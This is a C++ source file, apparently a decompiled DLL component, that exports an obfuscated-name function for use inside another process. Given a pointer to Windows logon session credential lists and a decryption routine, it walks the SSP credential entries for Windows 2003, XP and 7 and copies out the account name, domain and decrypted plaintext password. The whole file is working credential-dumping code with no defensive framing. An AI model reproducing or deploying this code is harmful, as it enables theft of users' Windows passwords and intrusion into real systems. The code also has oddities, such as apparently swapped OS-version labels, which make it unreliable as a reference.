#include "stdafx.h"

__declspec(noinline) int __cdecl wstrcpy2a(char *buf, size_t buf_len, wchar_t *src, size_t src_len) {

	BOOL bRet = FALSE;

	if (src && src_len && buf && buf_len) {

		if (src_len <= buf_len) {
			
			memset(buf, 0, buf_len);
			size_t index_buf = 0;
			size_t index_w = 0;

			while (index_w < buf_len) {

				if (!LOBYTE(src[index_buf])) {
					buf[index_w] = 0;
					break;
				}

				if (LOBYTE(src[index_buf])) {
					buf[index_w] = LOBYTE(src[index_buf]);
				}

				++index_w;
				++index_buf;
			}
			
			buf[buf_len - 1] = '\0';
			bRet = TRUE;
		}
	}
	
	return bRet;
}

extern "C" _declspec(dllexport) void *__cdecl _0212DBDHJKSAHD0183923kljmLKL(REMOTE_PARAM_T *remp) {

	void *pRet = NULL; // eax@2

	if (!remp) {
		return pRet;
	}
	
	remp->Retn = 0;
	if (!remp->dwDecryptAddr || !remp->dwLogonSessionEntry) {
		pRet = remp;
		return pRet;
	}

	BOOL bfindsession = FALSE; // [sp+C04h] [bp-CCh]@17
	BOOL bwin2003 = FALSE; // [sp+C08h] [bp-C8h]@6
	BOOL bwinxp = FALSE; // [sp+C0Ch] [bp-C4h]@6

	OSVERSIONINFOA verinfo = {0};
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
	GetVersionExA(&verinfo);
	if (verinfo.dwMajorVersion < 6) {
		if ((verinfo.dwMajorVersion != 5) || (verinfo.dwMinorVersion != 2))
			bwin2003 = 1;
		else
			bwinxp = 1;
	}
	else {
		bwin2003 = 0;
	}

	SSP_CREDENTIAL_XP *pFlinkXp = NULL; // [sp+C10h] [bp-C0h]@15
	SSP_CREDENTIAL_XP *pCrendXP = NULL; // [sp+C14h] [bp-BCh]@15

	SSP_CREDENTIAL_W7 *pFlinkW7 = NULL; // [sp+C1Ch] [bp-B4h]@16
	SSP_CREDENTIAL_W7 *pCrendW7 = NULL; // [sp+C20h] [bp-B0h]@16

	SSP_CREDENTIAL *pFlink2003 = NULL; // [sp+C24h] [bp-ACh]@13
	SSP_CREDENTIAL *pCrend2003 = NULL;

	if (bwin2003) {
		pCrend2003 = *(SSP_CREDENTIAL **)remp->dwLogonSessionEntry;
		pFlink2003 = pCrend2003;
	}
	else {
		if (bwinxp) {
			pCrendXP = *(SSP_CREDENTIAL_XP **)remp->dwLogonSessionEntry;
			pFlinkXp = pCrendXP;
		}
		else {
			pCrendW7 = *(SSP_CREDENTIAL_W7 **)remp->dwLogonSessionEntry;
			pFlinkW7 = pCrendW7;
		}
	}

	while (true) {

		if (bwin2003) {
			pRet = remp;
			if (pCrend2003->LogonId.LowPart == remp->LogonId.LowPart)
				bfindsession = 1;
		}
		else {
			if (bwinxp) {
				pRet = remp;
				if (pCrendXP->LogonId.LowPart == remp->LogonId.LowPart)
					bfindsession = 1;
			}
			else {
				pRet = remp;
				if (pCrendW7->LogonId.LowPart == remp->LogonId.LowPart)
					bfindsession = 1;
			}
		}

		if (bfindsession == 1)
			break;

		if (bwin2003) {
			pRet = pCrend2003->Flink;
			pCrend2003 = pCrend2003->Flink;
			if (pCrend2003 == pFlink2003)
				break;
		}
		else {
			if (bwinxp) {
				pRet = pCrendXP->Flink;
				pCrendXP = pCrendXP->Flink;
				if (pCrendXP == pFlinkXp)
					break;
			}
			else {
				pRet = pCrendW7->Flink;
				pCrendW7 = pCrendW7->Flink;
				if (pCrendW7 == pFlinkW7)
					break;
			}
		}
	}

	if (bfindsession) {

		pfn_BCryptDecrypt BCryptDecrypt = (pfn_BCryptDecrypt)remp->dwDecryptAddr;
		if (bwin2003) {
			
			wstrcpy2a(remp->szAccount, 0x3FFu, pCrend2003->Account.Buffer, pCrend2003->Account.Length);
			wstrcpy2a(remp->szDomain, 0x3FFu, pCrend2003->Domain.Buffer, pCrend2003->Domain.Length);
			
			remp->SessionId = pCrend2003->SessionId;

			if (pCrend2003->Password.Length > 1) {

				wchar_t pwdbuf_2003[512] = {0};
				memmove(pwdbuf_2003, pCrend2003->Password.Buffer, pCrend2003->Password.MaximumLength);
						
				BCryptDecrypt(pwdbuf_2003, pCrend2003->Password.MaximumLength);
						
				wstrcpy2a(remp->szPassword, 0x3FFu, pwdbuf_2003, pCrend2003->Password.MaximumLength);
			}
		}
		else if (bwinxp) {
			
			wstrcpy2a(remp->szAccount, 0x3FFu, pCrendXP->Account.Buffer, pCrendXP->Account.Length);
			wstrcpy2a(remp->szDomain, 0x3FFu, pCrendXP->Domain.Buffer, pCrendXP->Domain.Length);
			
			remp->SessionId = pCrendXP->SessionId;
			
			if (pCrendXP->Password.Length > 1) {

				wchar_t pwdbuf_xp[512] = {0};
				memmove(pwdbuf_xp, pCrendXP->Password.Buffer, pCrendXP->Password.MaximumLength);
							
				BCryptDecrypt(pwdbuf_xp, pCrendXP->Password.MaximumLength);
							
				wstrcpy2a(remp->szPassword, 0x3FFu, pwdbuf_xp, pCrendXP->Password.MaximumLength);
			}
		}
		else {
			
			wstrcpy2a(remp->szAccount, 0x3FFu, pCrendW7->Account.Buffer, pCrendW7->Account.Length);
			wstrcpy2a(remp->szDomain, 0x3FFu, pCrendW7->Domain.Buffer, pCrendW7->Domain.Length);
			
			remp->SessionId = pCrendW7->SessionId;
			
			if (pCrendW7->Password.Length > 1) {

				wchar_t pwdbuf_win7[512] = {0};
				memmove(pwdbuf_win7, pCrendW7->Password.Buffer, pCrendW7->Password.MaximumLength);
							
				BCryptDecrypt(pwdbuf_win7, pCrendW7->Password.MaximumLength);
							
				wstrcpy2a(remp->szPassword, 0x3FFu, pwdbuf_win7, pCrendW7->Password.MaximumLength);
			}
		}

		remp->Retn = 1;
	}

	return pRet;
}